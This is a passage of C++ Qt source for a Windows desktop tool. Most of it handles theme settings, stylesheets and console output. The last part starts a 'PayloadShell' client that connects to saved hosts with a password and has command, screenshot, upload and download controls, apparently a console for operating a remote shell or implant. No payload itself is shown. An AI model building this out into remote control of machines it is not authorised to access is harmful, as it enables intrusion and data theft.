    Palette.ElevatedSurface = ConfiguredColor("SurfaceElevatedColor", Defaults.ElevatedSurface);
    Palette.SunkenSurface = ConfiguredColor("SurfaceSunkenColor", Defaults.SunkenSurface);
    Palette.InputSurface = ConfiguredColor("InputSurfaceColor",
                                           ConfiguredColor("SurfaceColor", Defaults.InputSurface));
    Palette.TableSurface = ConfiguredColor("TableSurfaceColor",
                                           ConfiguredColor("SurfaceColor", Defaults.TableSurface));
    Palette.PopupSurface = ConfiguredColor("PopupSurfaceColor", Defaults.PopupSurface);
    Palette.Border = ConfiguredColor("BorderColor", Defaults.Border);
    Palette.Divider = ConfiguredColor("DividerColor", Defaults.Divider);
    Palette.Text = ConfiguredColor("TextColor", Defaults.Text);
    Palette.MutedText = ConfiguredColor("MutedTextColor", Defaults.MutedText);
    Palette.SelectionText = ConfiguredColor("SelectionTextColor", Defaults.SelectionText);
    Palette.Danger = ConfiguredColor("DangerColor", Defaults.Danger);
    Palette.Warning = ConfiguredColor("WarningColor", Defaults.Warning);
    Palette.Success = ConfiguredColor("SuccessColor", Defaults.Success);
    return Palette;
}

void EnsureThemeConfiguration()
{
    QJsonObject ThemeObject = Configuration.value("Theme").toObject();
    const ThemePalette &Defaults = DefaultThemePalette();
    const std::array<std::pair<const char *, QJsonValue>, 23> DefaultEntries{{
        {"DarkMode", KDefaultThemeDarkMode},
        {"BackgroundMaterial", KDefaultThemeBackgroundMaterial},
        {"WallpaperPath", ""},
        {"WallpaperMode", 0},
        {"WallpaperOpacity", KDefaultThemeWallpaperOpacity},
        {"AccentColor", Defaults.Accent.name(QColor::HexRgb).toUpper()},
        {"AccentHoverColor", Defaults.AccentHover.name(QColor::HexRgb).toUpper()},
        {"AccentPressedColor", Defaults.AccentPressed.name(QColor::HexRgb).toUpper()},
        {"PageBackgroundColor", Defaults.PageBackground.name(QColor::HexRgb).toUpper()},
        {"CardSurfaceColor", Defaults.CardSurface.name(QColor::HexRgb).toUpper()},
        {"SurfaceElevatedColor", Defaults.ElevatedSurface.name(QColor::HexRgb).toUpper()},
        {"SurfaceSunkenColor", Defaults.SunkenSurface.name(QColor::HexRgb).toUpper()},
        {"InputSurfaceColor", Defaults.InputSurface.name(QColor::HexRgb).toUpper()},
        {"TableSurfaceColor", Defaults.TableSurface.name(QColor::HexRgb).toUpper()},
        {"PopupSurfaceColor", Defaults.PopupSurface.name(QColor::HexRgb).toUpper()},
        {"TextColor", Defaults.Text.name(QColor::HexRgb).toUpper()},
        {"MutedTextColor", Defaults.MutedText.name(QColor::HexRgb).toUpper()},
        {"BorderColor", Defaults.Border.name(QColor::HexRgb).toUpper()},
        {"DividerColor", Defaults.Divider.name(QColor::HexRgb).toUpper()},
        {"SelectionTextColor", Defaults.SelectionText.name(QColor::HexRgb).toUpper()},
        {"DangerColor", Defaults.Danger.name(QColor::HexRgb).toUpper()},
        {"WarningColor", Defaults.Warning.name(QColor::HexRgb).toUpper()},
        {"SuccessColor", Defaults.Success.name(QColor::HexRgb).toUpper()}}};
    bool Changed = false;
    for (const auto &[Key, Value] : DefaultEntries)
    {
        if (!ThemeObject.contains(Key))
        {
            ThemeObject.insert(Key, Value);
            Changed = true;
        }
    }
    if (ThemeObject.contains("Preset"))
    {
        ThemeObject.remove("Preset");
        Changed = true;
    }
    if (ThemeObject.contains("MenuCornerRadius"))
    {
        ThemeObject.remove("MenuCornerRadius");
        Changed = true;
    }
    if (!ThemeObject.contains("Density"))
    {
        ThemeObject.insert("Density", KDefaultThemeDensity);
        Changed = true;
    }
    if (!ThemeObject.contains("CornerRadius"))
    {
        ThemeObject.insert("CornerRadius", KDefaultThemeCornerRadius);
        Changed = true;
    }
    if (!ThemeObject.contains("FontScale"))
    {
        ThemeObject.insert("FontScale", KDefaultThemeFontScale);
        Changed = true;
    }
    if (ThemeObject.value("BackgroundColor").toString().isEmpty())
    {
        ThemeObject.insert("BackgroundColor", ThemeObject.value("PageBackgroundColor").toString());
        Changed = true;
    }
    if (ThemeObject.value("SurfaceColor").toString().isEmpty())
    {
        ThemeObject.insert("SurfaceColor", ThemeObject.value("CardSurfaceColor").toString());
        Changed = true;
    }
    if (Changed || !Configuration.contains("Theme"))
    {
        Configuration.insert("Theme", ThemeObject);
        SaveConfiguration();
    }
}

QJsonObject ConfigurationSection(const QString &Section)
{
    return Configuration.value(Section).toObject();
}

QJsonValue ConfigurationValue(const QString &Section, const QString &Key, const QJsonValue &Fallback)
{
    return ConfigurationSection(Section).value(Key).isUndefined() ? Fallback : ConfigurationSection(Section).value(Key);
}

void SetConfigurationValue(const QString &Section, const QString &Key, const QJsonValue &Value)
{
    QJsonObject Object = ConfigurationSection(Section);
    Object.insert(Key, Value);
    Configuration.insert(Section, Object);
    SaveConfiguration();
}

void SetConfigurationValueTransient(const QString &Section, const QString &Key, const QJsonValue &Value)
{
    QJsonObject Object = ConfigurationSection(Section);
    Object.insert(Key, Value);
    Configuration.insert(Section, Object);
}

QStringList ConfigurationPaths(const QString &Section, const QString &Fallback)
{
    QStringList Paths;
    for (const QJsonValue &Value : ConfigurationValue(Section, "Paths", QJsonArray()).toArray())
        Paths.append(Value.toString());
    if (Paths.isEmpty())
        Paths.append(Fallback);
    return Paths;
}

void SetConfigurationPath(const QString &Section, const QString &Path)
{
    QJsonArray Paths;
    Paths.append(Path);
    SetConfigurationValue(Section, "Paths", Paths);
}

QColor ConfiguredColor(const QString &Key, const QColor &Fallback)
{
    const QColor Color(ConfigurationValue("Theme", Key, "").toString());
    return Color.isValid() ? Color : Fallback;
}

QColor PrimaryTextColor()
{
    return CurrentThemePalette().Text;
}

QColor MutedTextColor()
{
    return CurrentThemePalette().MutedText;
}

QString CssColor(const QColor &Color)
{
    return QString("rgba(%1, %2, %3, %4)")
        .arg(Color.red()).arg(Color.green()).arg(Color.blue()).arg(Color.alpha());
}


bool ApplyWindowBackdrop(QWidget *Window, int Material)
{
    if (!Window)
        return false;
    Window->winId();
    auto *WindowAgent = Window->findChild<QWK::WidgetWindowAgent *>();
    if (!WindowAgent)
    {
        Window->setProperty("ThemeBackdropSupported", false);
        return false;
    }

    WindowAgent->setWindowAttribute("dark-mode", ConfigurationValue("Theme", "DarkMode", KDefaultThemeDarkMode).toBool());
    for (const QString &Attribute : {QStringLiteral("dwm-blur"), QStringLiteral("acrylic-material"),
                                     QStringLiteral("mica"), QStringLiteral("mica-alt")})
        WindowAgent->setWindowAttribute(Attribute, false);

    bool Supported = Material == 0;
    int EffectiveMaterial = 0;
    if (Material == 1)
    {
        Supported = WindowAgent->setWindowAttribute("mica", true);
        if (Supported)
            EffectiveMaterial = 1;
    }
    else if (Material == 2)
    {
        Supported = WindowAgent->setWindowAttribute("acrylic-material", true);
        if (!Supported)
            Supported = WindowAgent->setWindowAttribute("dwm-blur", true);
        if (Supported)
            EffectiveMaterial = 2;
    }
    Window->setAttribute(Qt::WA_StyledBackground, true);
    Window->setAttribute(Qt::WA_NoSystemBackground, EffectiveMaterial != 0);
    Window->setAutoFillBackground(EffectiveMaterial == 0);
    Window->setProperty("ThemeBackdropSupported", Supported);
    Window->setProperty("ThemeBackdropEffectiveMaterial", EffectiveMaterial);
    Window->update();
    if (Window->isVisible())
        DwmFlush();
    return Supported;
}

void ScheduleBackdropRefresh(QWidget *Window)
{
    if (!Window || Window->property("ThemeBackdropRefreshPending").toBool() ||
        Window->property("ThemeAppearanceFinalizePending").toBool() ||
        Window->property("ThemeBackdropApplying").toBool() ||
        Window->property("ThemeApplyQueued").toBool())
        return;

    Window->setProperty("ThemeBackdropRefreshPending", true);
    QPointer<QWidget> Guard(Window);
    QTimer::singleShot(30, Window, [Guard] {
        if (!Guard)
            return;
        Guard->setProperty("ThemeBackdropRefreshPending", false);
        const int Material = std::clamp(ConfigurationValue("Theme", "BackgroundMaterial", KDefaultThemeBackgroundMaterial).toInt(), 0, 2);
        ApplyWindowBackdrop(Guard, Material);
        Guard->update();
    });
}

void ScheduleAppearanceFinalize(QWidget *Window, int RequestedMaterial)
{
    if (!Window)
        return;

    Window->setProperty("ThemeRequestedMaterial", RequestedMaterial);
    if (Window->property("ThemeAppearanceFinalizePending").toBool())
        return;

    Window->setProperty("ThemeAppearanceFinalizePending", true);
    QPointer<QWidget> Guard(Window);
    QTimer::singleShot(180, Window, [Guard] {
        if (!Guard)
            return;
        const int Material = std::clamp(Guard->property("ThemeRequestedMaterial").toInt(), 0, 2);
        const int CurrentMaterial = Guard->property("ThemeBackdropEffectiveMaterial").toInt();
        Guard->setProperty("ThemeBackdropApplying", true);
        const auto FinishApply = [Guard](int EffectiveMaterial) {
            if (!Guard)
                return;
            Guard->setStyleSheet(ApplicationStyleSheet(EffectiveMaterial));
            Guard->setProperty("ThemeBackdropApplying", false);
            Guard->setProperty("ThemeAppearanceFinalizePending", false);
            Guard->update();
        };
        if (Material != 0 && CurrentMaterial != 0 && CurrentMaterial != Material)
        {
            ApplyWindowBackdrop(Guard, 0);
            QTimer::singleShot(80, Guard, [Guard, Material, FinishApply] {
                if (!Guard)
                    return;
                ApplyWindowBackdrop(Guard, Material);
                FinishApply(Guard->property("ThemeBackdropEffectiveMaterial").toInt());
            });
            return;
        }

        ApplyWindowBackdrop(Guard, Material);
        FinishApply(Guard->property("ThemeBackdropEffectiveMaterial").toInt());
    });
}

QString ApplicationStyleSheet(int MaterialOverride)
{
    ThemePalette Palette = CurrentThemePalette();
    QColor PageBackground = Palette.PageBackground;
    QColor CardSurface = Palette.CardSurface;
    QColor ElevatedSurface = Palette.ElevatedSurface;
    QColor SunkenSurface = Palette.SunkenSurface;
    QColor InputSurface = Palette.InputSurface;
    QColor TableSurface = Palette.TableSurface;
    QColor PopupSurface = Palette.PopupSurface;
    const QColor Text = Palette.Text;
    const QColor MutedText = Palette.MutedText;
    const QColor Border = Palette.Border;
    const QColor Divider = Palette.Divider;
    const QColor Accent = Palette.Accent;
    const QColor AccentHover = Palette.AccentHover;
    const QColor AccentPressed = Palette.AccentPressed;
    const QColor SelectionText = Palette.SelectionText;
    const QColor Danger = Palette.Danger;
    const QColor Warning = Palette.Warning;
    const QColor Success = Palette.Success;
    const int CornerRadius = std::clamp(ConfigurationValue("Theme", "CornerRadius", KDefaultThemeCornerRadius).toInt(), 0, 12);
    const int Density = std::clamp(ConfigurationValue("Theme", "Density", KDefaultThemeDensity).toInt(), 80, 120);
    const int Material = MaterialOverride >= 0
        ? std::clamp(MaterialOverride, 0, 2)
        : std::clamp(ConfigurationValue("Theme", "BackgroundMaterial", KDefaultThemeBackgroundMaterial).toInt(), 0, 2);
    const bool WallpaperEnabled = !ConfigurationValue("Theme", "WallpaperPath", "").toString().isEmpty();
    if (Material == 1)
        PageBackground = WithAlpha(PageBackground, 214);
    else if (Material == 2)
        PageBackground = WithAlpha(PageBackground, 184);
    if (WallpaperEnabled)
        PageBackground.setAlpha(std::min(PageBackground.alpha(), 168));
    const int HeaderPadding = std::clamp(qRound(6.0 * Density / 100.0), 4, 8);
    const int MenuVerticalPadding = std::clamp(qRound(7.0 * Density / 100.0), 5, 9);
    const QColor HoverOverlay = BlendColors(CardSurface, AccentHover, 0.12);
    const QColor PressedOverlay = BlendColors(CardSurface, AccentPressed, 0.18);
    const QColor InputBorder = BlendColors(Border, Accent, 0.18);
    const QColor SidebarSurface = BlendColors(CardSurface, ElevatedSurface, 0.35);
    QString Style = R"QSS(
        QFrame#Sidebar, QWidget#Brand { background: {{SIDEBAR_SURFACE}}; border: none; }
        QWidget#WindowBody { background: transparent; }
        QFrame#TitleBar { background: transparent; border: none; }
        QPushButton#TitleBarIcon,
        QPushButton#TitleBarMinimize,
        QPushButton#TitleBarMaximize,
        QPushButton#TitleBarClose {
            background: transparent;
            border: none;
            border-radius: 0;
            padding: 0;
        }
        QPushButton#TitleBarIcon:hover,
        QPushButton#TitleBarMinimize:hover,
        QPushButton#TitleBarMaximize:hover { background: rgba(128, 128, 128, 32); }
        QPushButton#TitleBarClose:hover { background: #C42B1C; color: white; }
        QPushButton#TitleBarClose:pressed { background: #A4261A; color: white; }
        QWidget#Content { background: {{PAGE_BACKGROUND}}; }
        QWidget#InformationContent,
        QWidget#SettingsContent,
        QScrollArea#InformationScroll,
        QScrollArea#SettingsScroll {
            background: {{PAGE_BACKGROUND}};
            border: none;
        }
        QFrame#toolPanel, QFrame#settingRow {
            background: {{CARD_SURFACE}};
            border: 1px solid {{BORDER}};
            border-radius: {{CARD_RADIUS}}px;
        }
        QFrame#ThemePreviewCard {
            background: {{POPUP_SURFACE}};
            border: 1px solid {{BORDER}};
            border-radius: {{CARD_RADIUS}}px;
        }
        QFrame#ThemePreviewNavItem,
        QFrame#ThemePreviewTableRow,
        QFrame#ThemePreviewStatusGood,
        QFrame#ThemePreviewStatusWarn,
        QFrame#ThemePreviewStatusDanger {
            border-radius: {{SMALL_RADIUS}}px;
        }
        QFrame#ThemePreviewNavItem {
            background: {{HOVER_SURFACE}};
            border: 1px solid {{PRESSED_SURFACE}};
        }
        QFrame#ThemePreviewTableRow {
            background: {{TABLE_SURFACE}};
            border: 1px solid {{DIVIDER}};
        }
        QFrame#ThemePreviewStatusGood { background: {{SUCCESS_TINT}}; }
        QFrame#ThemePreviewStatusWarn { background: {{WARNING_TINT}}; }
        QFrame#ThemePreviewStatusDanger { background: {{DANGER_TINT}}; }
        QFrame#settingRow QLabel { color: {{TEXT}}; }
        QLabel[TextRole="Muted"] { color: {{MUTED_TEXT}}; }
        QLabel, QAbstractButton, QLineEdit, QTextEdit, QPlainTextEdit,
        QTreeView, QTableView, QTableWidget { color: {{TEXT}}; }
        QTreeView, QTableView, QTableWidget, QLineEdit, QTextEdit, QPlainTextEdit {
            selection-background-color: {{ACCENT}};
            selection-color: {{SELECTION_TEXT}};
        }
        QLineEdit, QTextEdit, QPlainTextEdit, QAbstractSpinBox, QComboBox {
            background: {{INPUT_SURFACE}};
            border: 1px solid {{INPUT_BORDER}};
            border-radius: {{SMALL_RADIUS}}px;
            padding: 5px 8px;
        }
        QLineEdit:focus, QTextEdit:focus, QPlainTextEdit:focus, QAbstractSpinBox:focus, QComboBox:focus {
            border: 1px solid {{ACCENT}};
        }
        QTreeView, QTableView, QTableWidget {
            background: {{TABLE_SURFACE}};
            alternate-background-color: {{TABLE_ALT_SURFACE}};
            border: 1px solid {{DIVIDER}};
            border-radius: {{SMALL_RADIUS}}px;
            gridline-color: {{DIVIDER}};
        }
        QHeaderView::section {
            color: {{TEXT}};
            background: {{HEADER_SURFACE}};
            border: none;
            border-bottom: 1px solid {{DIVIDER}};
            padding: {{HEADER_PADDING}}px;
        }
        QMenu {
            color: {{TEXT}};
            background: {{POPUP_SURFACE}};
            border: 1px solid {{BORDER}};
            border-radius: 6px;
        }
        QMenu::item { padding: {{MENU_PADDING}}px 24px; }
        QMenu::item:selected { background: {{ACCENT}}; color: {{SELECTION_TEXT}}; }
        QPushButton {
            border-radius: {{SMALL_RADIUS}}px;
            border: 1px solid {{BORDER}};
            background: {{CARD_SURFACE}};
            padding: 6px 12px;
        }
        QPushButton:hover { background: {{HOVER_SURFACE}}; }
        QPushButton:pressed { background: {{PRESSED_SURFACE}}; }
        PrimaryPushButton {
            border-radius: {{SMALL_RADIUS}}px;
            border: 1px solid {{ACCENT}};
            background: {{ACCENT}};
            color: {{SELECTION_TEXT}};
            padding: 6px 12px;
        }
        PrimaryPushButton:hover { background: {{ACCENT_HOVER}}; border-color: {{ACCENT_HOVER}}; }
        PrimaryPushButton:pressed { background: {{ACCENT_PRESSED}}; border-color: {{ACCENT_PRESSED}}; }
        QAbstractScrollArea::corner { background: transparent; }
    )QSS";
    const std::array<std::pair<QString, QString>, 21> Tokens{{
        {QStringLiteral("{{SIDEBAR_SURFACE}}"), CssColor(SidebarSurface)},
        {QStringLiteral("{{PAGE_BACKGROUND}}"), CssColor(PageBackground)},
        {QStringLiteral("{{CARD_SURFACE}}"), CssColor(CardSurface)},
        {QStringLiteral("{{BORDER}}"), CssColor(Border)},
        {QStringLiteral("{{CARD_RADIUS}}"), QString::number(CornerRadius)},
        {QStringLiteral("{{POPUP_SURFACE}}"), CssColor(PopupSurface)},
        {QStringLiteral("{{SMALL_RADIUS}}"), QString::number(std::max(4, CornerRadius - 2))},
        {QStringLiteral("{{HOVER_SURFACE}}"), CssColor(HoverOverlay)},
        {QStringLiteral("{{PRESSED_SURFACE}}"), CssColor(PressedOverlay)},
        {QStringLiteral("{{TABLE_SURFACE}}"), CssColor(TableSurface)},
        {QStringLiteral("{{DIVIDER}}"), CssColor(Divider)},
        {QStringLiteral("{{SUCCESS_TINT}}"), CssColor(WithAlpha(Success, 34))},
        {QStringLiteral("{{WARNING_TINT}}"), CssColor(WithAlpha(Warning, 34))},
        {QStringLiteral("{{DANGER_TINT}}"), CssColor(WithAlpha(Danger, 34))},
        {QStringLiteral("{{MUTED_TEXT}}"), MutedText.name()},
        {QStringLiteral("{{TEXT}}"), CssColor(Text)},
        {QStringLiteral("{{SELECTION_TEXT}}"), SelectionText.name()},
        {QStringLiteral("{{INPUT_SURFACE}}"), CssColor(InputSurface)},
        {QStringLiteral("{{INPUT_BORDER}}"), CssColor(InputBorder)},
        {QStringLiteral("{{TABLE_ALT_SURFACE}}"), CssColor(BlendColors(TableSurface, SunkenSurface, 0.55))},
        {QStringLiteral("{{HEADER_SURFACE}}"), CssColor(SunkenSurface)},
    }};
    for (const auto &[Token, Value] : Tokens)
        Style.replace(Token, Value);
    Style.replace(QStringLiteral("{{ACCENT}}"), CssColor(Accent));
    Style.replace(QStringLiteral("{{ACCENT_HOVER}}"), CssColor(AccentHover));
    Style.replace(QStringLiteral("{{ACCENT_PRESSED}}"), CssColor(AccentPressed));
    Style.replace(QStringLiteral("{{HEADER_PADDING}}"), QString::number(HeaderPadding));
    Style.replace(QStringLiteral("{{MENU_PADDING}}"), QString::number(MenuVerticalPadding));
    return Style;
}

void ApplyConfiguredAppearance(QWidget *Window)
{
    const bool DarkMode = ConfigurationValue("Theme", "DarkMode", KDefaultThemeDarkMode).toBool();
    const ThemePalette PaletteColors = CurrentThemePalette();
    const int RequestedMaterial = std::clamp(ConfigurationValue("Theme", "BackgroundMaterial", KDefaultThemeBackgroundMaterial).toInt(), 0, 2);
    Theme::setThemeMode(DarkMode ? Fluent::ThemeMode::DARK : Fluent::ThemeMode::LIGHT);
    Theme::setThemeColor(PaletteColors.Accent);
    static const qreal DefaultFontPointSize = QApplication::font().pointSizeF() > 0
                                                   ? QApplication::font().pointSizeF()
                                                   : 9.0;
    const int FontScale = std::clamp(ConfigurationValue("Theme", "FontScale", KDefaultThemeFontScale).toInt(), 85, 125);
    QFont ApplicationFont = qApp->font();
    ApplicationFont.setPointSizeF(DefaultFontPointSize * FontScale / 100.0);
    qApp->setFont(ApplicationFont);
    if (Window)
    {
        QPalette Palette = Window->palette();
        Palette.setColor(QPalette::Window, PaletteColors.PageBackground);
        Palette.setColor(QPalette::WindowText, PrimaryTextColor());
        Palette.setColor(QPalette::Text, PrimaryTextColor());
        Palette.setColor(QPalette::ButtonText, PrimaryTextColor());
        Palette.setColor(QPalette::PlaceholderText, MutedTextColor());
        Palette.setColor(QPalette::Base, PaletteColors.InputSurface);
        Palette.setColor(QPalette::Button, PaletteColors.CardSurface);
        Palette.setColor(QPalette::Highlight, PaletteColors.Accent);
        Palette.setColor(QPalette::HighlightedText, PaletteColors.SelectionText);
        qApp->setPalette(Palette);
        Window->setPalette(Palette);
        Window->setStyleSheet(ApplicationStyleSheet(0));
        for (FluentLabelBase *Label : Window->findChildren<FluentLabelBase *>())
        {
            const QString Role = Label->property("TextRole").toString();
            if (Role == "Primary")
                Label->setTextColor(PrimaryTextColor(), PrimaryTextColor());
            else if (Role == "Muted")
                Label->setTextColor(MutedTextColor(), MutedTextColor());
            else if (Role == "Accent")
                Label->setTextColor(ConfiguredColor("AccentColor", KAccent),
                                    ConfiguredColor("AccentColor", KAccent));
            const int BasePixelSize = Label->property("ThemeBasePixelSize").toInt();
            if (BasePixelSize > 0)
            {
                QFont Font = Label->font();
                Font.setPixelSize(std::max(8, qRound(BasePixelSize * FontScale / 100.0)));
                Label->setFont(Font);
            }
        }
        Window->setWindowOpacity(std::clamp(ConfigurationValue("Application", "Opacity", 1.0).toDouble(), 0.35, 1.0));
        ScheduleAppearanceFinalize(Window, RequestedMaterial);
    }
}

void QueueThemeApply(QWidget *Window, bool SaveChanges, bool UpdateWindow)
{
    if (!Window)
        return;

    Window->setProperty("ThemeApplyNeedsSave", Window->property("ThemeApplyNeedsSave").toBool() || SaveChanges);
    Window->setProperty("ThemeApplyNeedsUpdate", Window->property("ThemeApplyNeedsUpdate").toBool() || UpdateWindow);
    if (Window->property("ThemeApplyQueued").toBool())
        return;

    Window->setProperty("ThemeApplyQueued", true);
    QPointer<QWidget> Guard(Window);
    QTimer::singleShot(0, Window, [Guard] {
        if (!Guard)
            return;
        const bool Save = Guard->property("ThemeApplyNeedsSave").toBool();
        const bool Update = Guard->property("ThemeApplyNeedsUpdate").toBool();
        Guard->setProperty("ThemeApplyQueued", false);
        Guard->setProperty("ThemeApplyNeedsSave", false);
        Guard->setProperty("ThemeApplyNeedsUpdate", false);
        if (Save)
            SaveConfiguration();
        ApplyConfiguredAppearance(Guard);
        if (Update)
            Guard->update();
    });
}

std::vector<ModuleEntry> DllModules;
std::vector<ModuleEntry> DriverModules;
bool ModulesScanned = false;
std::atomic_bool ModuleRunning = false;
QString RunningModulePath;
QString ConsoleTranscript = "[*] Console ready. Module output will appear here.\n";
QString ModuleTranscript;
QPointer<PlainTextEdit> ConsoleOutputWidget;
QPointer<PlainTextEdit> ModuleOutputWidget;
QPointer<QProcess> ActiveConsoleProcess;
std::mutex OutputMutex;

QString ResolveRuntimePath(const QString &Path)
{
    const QFileInfo Info(Path);
    return QDir::cleanPath(Info.isAbsolute() ? Info.absoluteFilePath()
                                             : QDir(QCoreApplication::applicationDirPath()).absoluteFilePath(Path));
}

QString Utf8Text(const std::string &Text)
{
    return QString::fromUtf8(Text.data(), static_cast<qsizetype>(Text.size()));
}

std::string Utf8Bytes(const QString &Text)
{
    const QByteArray Bytes = Text.toUtf8();
    return std::string(Bytes.constData(), static_cast<size_t>(Bytes.size()));
}

QString DecodeMultiByteText(UINT CodePage, DWORD Flags, const QByteArray &Bytes)
{
    if (Bytes.isEmpty())
        return {};
    const int WideLength = MultiByteToWideChar(CodePage, Flags, Bytes.constData(), Bytes.size(), nullptr, 0);
    if (WideLength <= 0)
        return {};
    std::wstring Wide(static_cast<size_t>(WideLength), L'\0');
    if (MultiByteToWideChar(CodePage, Flags, Bytes.constData(), Bytes.size(), Wide.data(), WideLength) <= 0)
        return {};
    return QString::fromWCharArray(Wide.data(), WideLength);
}

QString DecodeConsoleProcessOutput(const QByteArray &Bytes)
{
    if (Bytes.isEmpty())
        return {};

    if (Bytes.size() >= 2)
    {
        const uchar B0 = static_cast<uchar>(Bytes[0]);
        const uchar B1 = static_cast<uchar>(Bytes[1]);
        if ((B0 == 0xFF && B1 == 0xFE) || (B0 == 0xFE && B1 == 0xFF))
            return QString::fromUtf16(reinterpret_cast<const char16_t *>(Bytes.constData() + 2),
                                      (Bytes.size() - 2) / 2);
    }

    int ZeroCount = 0;
    for (char Byte : Bytes)
        ZeroCount += (Byte == '\0');
    if (ZeroCount >= Bytes.size() / 4)
        return QString::fromUtf16(reinterpret_cast<const char16_t *>(Bytes.constData()), Bytes.size() / 2);

    if (const QString Utf8 = DecodeMultiByteText(CP_UTF8, MB_ERR_INVALID_CHARS, Bytes); !Utf8.isEmpty())
        return Utf8;
    if (const QString Oem = DecodeMultiByteText(CP_OEMCP, 0, Bytes); !Oem.isEmpty())
        return Oem;
    if (const QString Ansi = DecodeMultiByteText(CP_ACP, 0, Bytes); !Ansi.isEmpty())
        return Ansi;
    return QString::fromLatin1(Bytes);
}

void AppendConsoleOutput(const QString &Text)
{
    {
        std::lock_guard<std::mutex> Lock(OutputMutex);
        ConsoleTranscript += Text;
    }
    QMetaObject::invokeMethod(qApp, [Text] {
        if (ConsoleOutputWidget)
        {
            ConsoleOutputWidget->moveCursor(QTextCursor::End);
            ConsoleOutputWidget->insertPlainText(Text);
            ConsoleOutputWidget->moveCursor(QTextCursor::End);
        }
    }, Qt::QueuedConnection);
}

void AppendModuleOutput(const QString &Text)
{
    {
        std::lock_guard<std::mutex> Lock(OutputMutex);
        ModuleTranscript += Text;
        ConsoleTranscript += Text;
    }
    QMetaObject::invokeMethod(qApp, [Text] {
        if (ConsoleOutputWidget)
        {
            ConsoleOutputWidget->moveCursor(QTextCursor::End);
            ConsoleOutputWidget->insertPlainText(Text);
            ConsoleOutputWidget->moveCursor(QTextCursor::End);
        }
        if (ModuleOutputWidget)
        {
            ModuleOutputWidget->moveCursor(QTextCursor::End);
            ModuleOutputWidget->insertPlainText(Text);
            ModuleOutputWidget->moveCursor(QTextCursor::End);
        }
    }, Qt::QueuedConnection);
}

QString ConsoleOutputSnapshot()
{
    std::lock_guard<std::mutex> Lock(OutputMutex);
    return ConsoleTranscript;
}

QString ModuleOutputSnapshot()
{
    std::lock_guard<std::mutex> Lock(OutputMutex);
    return ModuleTranscript;
}

void ClearConsoleOutput()
{
    {
        std::lock_guard<std::mutex> Lock(OutputMutex);
        ConsoleTranscript.clear();
    }
    if (ConsoleOutputWidget)
        ConsoleOutputWidget->clear();
}

void ClearModuleOutput()
{
    {
        std::lock_guard<std::mutex> Lock(OutputMutex);
        ModuleTranscript.clear();
    }
    if (ModuleOutputWidget)
        ModuleOutputWidget->clear();
}

void ShowModuleOutputDialog(QWidget *Parent, const QString &Title = "Module Output")
{
    auto *Dialog = new QDialog(Parent ? Parent->window() : QApplication::activeWindow());
    Dialog->setAttribute(Qt::WA_DeleteOnClose);
    Dialog->resize(920, 640);
    Dialog->setWindowTitle(Title);
    auto *Layout = new QVBoxLayout(Dialog);
    Layout->setContentsMargins(16, 16, 16, 16);
    Layout->setSpacing(10);
    auto *Output = new PlainTextEdit;
    Output->setReadOnly(true);
    Output->setFont(QFont("Cascadia Mono", 10));
    Output->setPlainText(ModuleOutputSnapshot());
    InstallFluentScrollBar(Output, Qt::Vertical);
    InstallFluentScrollBar(Output, Qt::Horizontal);
    auto *ButtonRow = new QHBoxLayout;
    ButtonRow->setContentsMargins(0, 0, 0, 0);
    ButtonRow->setSpacing(8);
    auto *Clear = MakeButton("Clear");
    auto *Close = MakeButton("Close", true);
    ButtonRow->addStretch();
    ButtonRow->addWidget(Clear);
    ButtonRow->addWidget(Close);
    Layout->addWidget(Output, 1);
    Layout->addLayout(ButtonRow);
    if (Output)
        ModuleOutputWidget = Output;
    QObject::connect(Dialog, &QObject::destroyed, qApp, [Output] {
        if (ModuleOutputWidget == Output)
            ModuleOutputWidget = nullptr;
    });
    QObject::connect(Clear, &QPushButton::clicked, Dialog, [Dialog] {
        ClearModuleOutput();
        ShowSuccessNotice(Dialog, "Module Output", "Module output cleared.");
    });
    QObject::connect(Close, &QPushButton::clicked, Dialog, &QDialog::accept);
    Dialog->show();
}

enum class PayloadShellReadState
{
    Disconnected,
    AwaitChallenge,
    AwaitLength,
    AwaitPayload
};

struct PayloadShellState
{
    QPointer<QWidget> Page;
    QPointer<QListWidget> HostList;
    QPointer<LineEdit> HostEdit;
    QPointer<LineEdit> PortEdit;
    QPointer<LineEdit> PasswordEdit;
    QPointer<PushButton> CommandButton;
    QPointer<PushButton> NewHostButton;
    QPointer<PushButton> SaveHostButton;
    QPointer<PushButton> RemoveHostButton;
    QPointer<PushButton> ConnectButton;
    QPointer<PushButton> DisconnectButton;
    std::map<qulonglong, std::shared_ptr<struct PayloadShellSession>> Sessions;
    qulonglong NextSessionId = 1;
};

constexpr int KPayloadShellRoleHost = Qt::UserRole + 1;
constexpr int KPayloadShellRolePort = Qt::UserRole + 2;
constexpr int KPayloadShellRolePassword = Qt::UserRole + 3;
constexpr int KPayloadShellRoleSessionId = Qt::UserRole + 4;

struct PayloadShellSession
{
    qulonglong Id = 0;
    std::weak_ptr<PayloadShellState> State;
    QListWidgetItem *HostItem = nullptr;
    QString Host;
    QString Port;
    QString Password;
    QPointer<LineEdit> CommandEdit;
    QPointer<PushButton> SendButton;
    QPointer<PushButton> ScreenshotButton;
    QPointer<PushButton> UploadButton;
    QPointer<PushButton> DownloadButton;
    QPointer<QDialog> CommandDialog;
    QPointer<QTextEdit> OutputView;
    QPointer<QTcpSocket> Socket;
    QByteArray ReceiveBuffer;
    QByteArray SessionKey;
    QString PendingCommand;
    QString Transcript;
    QString Status = "Disconnected";
    QColor StatusColor = QColor("#8A94A6");
    int ExpectedPayloadLength = 0;
    bool Authenticating = false;
    bool DisconnectRequested = false;
    PayloadShellReadState ReadState = PayloadShellReadState::Disconnected;
};

std::shared_ptr<PayloadShellSession> PayloadShellSessionForItem(const std::shared_ptr<PayloadShellState> &State,
                                                                QListWidgetItem *Item)
{
    if (!State || !Item)
        return nullptr;
    const qulonglong Id = Item->data(KPayloadShellRoleSessionId).toULongLong();
    const auto It = State->Sessions.find(Id);
    return It == State->Sessions.end() ? nullptr : It->second;
}

std::shared_ptr<PayloadShellSession> PayloadShellCurrentSession(const std::shared_ptr<PayloadShellState> &State)
{
    return State && State->HostList ? PayloadShellSessionForItem(State, State->HostList->currentItem()) : nullptr;
}

void PayloadShellRefreshHostItem(QListWidgetItem *Item, const QString &Status, const QColor &Color);

void PayloadShellRefreshSessionItem(const std::shared_ptr<PayloadShellSession> &Session)
{
    if (!Session || !Session->HostItem)
        return;
    PayloadShellRefreshHostItem(Session->HostItem, Session->Status, Session->StatusColor);
}

QString PayloadShellCurrentEndpoint(const std::shared_ptr<PayloadShellSession> &Session)
{
    if (!Session)
        return "Shell";
